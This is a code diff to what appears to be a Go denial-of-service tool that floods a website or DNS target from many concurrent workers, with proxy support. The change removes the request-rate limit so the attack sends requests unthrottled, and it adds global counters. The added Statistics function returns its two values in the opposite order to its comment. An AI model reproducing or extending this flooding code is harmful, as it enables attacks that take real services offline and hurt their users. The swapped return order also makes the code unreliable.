@@ -15,6 +15,11 @@ import (
 	"github.com/miekg/dns"
 )
 
+var (
+	totalRequests int64
+	totalErrors   int64
+)
+
 // The target type that manages a target. A target can be a website, a dns, or something like that.
 // TODO: refactor this into an interface and make New create different concrete types that deal with a particular kind of target.
 type Target struct {
@@ -36,6 +41,11 @@ type Target struct {
 	httpClient    *http.Client
 	dnsClient     *dns.Client
 	lastResolved  time.Time
+}
+
+// Statistics returns total number of requests and errors.
+func Statistics() (int64, int64) {
+	return atomic.LoadInt64(&totalErrors), atomic.LoadInt64(&totalRequests)
 }
 
 // Creates a target instance with all the configurations needed for an attack.
@@ -91,35 +101,39 @@ func (t *Target) SetProxy(proxy string) error {
 }
 
 // Run Executes an attack. Usually has to be called as a goroutine.
-// N is the number of concurrent workers and maxRPS is the target requests per second.
-func (t *Target) Run(ctx context.Context, N, maxRPS int, progress func(requests, errors int64)) {
+// N is the number of concurrent workers.
+func (t *Target) Run(ctx context.Context, N int, progress func(requests, errors int64)) {
 	t.requestCh = make(chan string, N)
 	timer := time.NewTicker(time.Second)
-	timerGen := time.NewTicker(time.Second / time.Duration(maxRPS))
 	defer close(t.requestCh)
 	defer timer.Stop()
-	defer timerGen.Stop()
 
 	for i := 0; i < N; i++ {
 		go t.flood(ctx)
 	}
-
+	sent := 0
 	for {
 		select {
 		case <-ctx.Done():
 			return
 		case <-t.exitCh:
 			return
-		case <-timerGen.C:
-			if t.isHostResolved() {
-				t.requestCh <- t.generate()
-			}
 		case <-timer.C:
 			requests := float64(atomic.SwapInt64(&t.requests, 0))
 			errors := float64(atomic.SwapInt64(&t.errors, 0))
+			atomic.AddInt64(&totalErrors, int64(errors))
+			atomic.AddInt64(&totalRequests, int64(requests))
+			// fmt.Println(totalRequests, totalRequests, len(t.requestCh), sent)
 			t.requestsPerSecond = (t.requestsPerSecond*3 + requests) / 4
 			t.errorsPerSecond = (t.errorsPerSecond*3 + errors) / 4
 			progress(int64(t.requestsPerSecond), int64(t.errorsPerSecond))
+		default:
+			sent++
+			if t.isHostResolved() {
+				t.requestCh <- t.generate()
+			} else {
+				time.Sleep(time.Second * 10)
+			}
 		}
 	}
 }
